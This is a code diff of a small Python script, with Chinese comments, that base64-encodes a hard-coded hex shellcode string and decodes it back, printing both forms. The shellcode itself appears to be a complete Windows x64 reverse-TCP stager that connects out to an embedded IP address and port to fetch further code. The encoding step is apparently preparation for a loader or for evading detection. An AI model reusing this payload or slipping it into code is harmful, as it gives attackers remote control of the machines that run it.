@@ -5,19 +5,23 @@
 # @Project : pythonBasics
 import base64
 
-# 从十六进制字符串转换为字节
+# 原始shellcode（十六进制字符串）
 shellcode = 'fc4883e4f0e8cc0000004151415052514831d25665488b5260488b5218488b52204d31c9480fb74a4a488b72504831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d0448b40208b4818504901d0e35648ffc94d31c9418b34884801d64831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200cc794536850341544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5'
+
+# 将十六进制字符串转换为字节对象
 shellcode_bytes = bytes.fromhex(shellcode)
 
-# 将 shellcode 转换为 base64 编码
-shellcode_base64 = base64.b64encode(shellcode_bytes).decode('utf-8')
-# print(f"Base64编码后的shellcode: {shellcode_base64}")
-print(f"{shellcode_base64}")
+# 将字节对象进行base64编码
+shellcode_base64 = base64.b64encode(shellcode_bytes)
+print(f"Base64编码后的shellcode: {shellcode_base64.decode('utf-8')}")
 
-# 对 base64 编码的 shellcode 进行解码
+
+
+print("============================================================================================")
+
+
+
+# 将base64编码后的字节对象解码为字节对象
 shellcode_b64decoded = base64.b64decode(shellcode_base64)
-
-# 将解码后的字节重新转换为十六进制字符串
 shellcode_hex = shellcode_b64decoded.hex()
-# print(f"解码后转换成十六进制的shellcode: {shellcode_hex}")
-print(f"{shellcode_hex}")
+print(f"解码后转换成十六进制的shellcode: {shellcode_hex}")
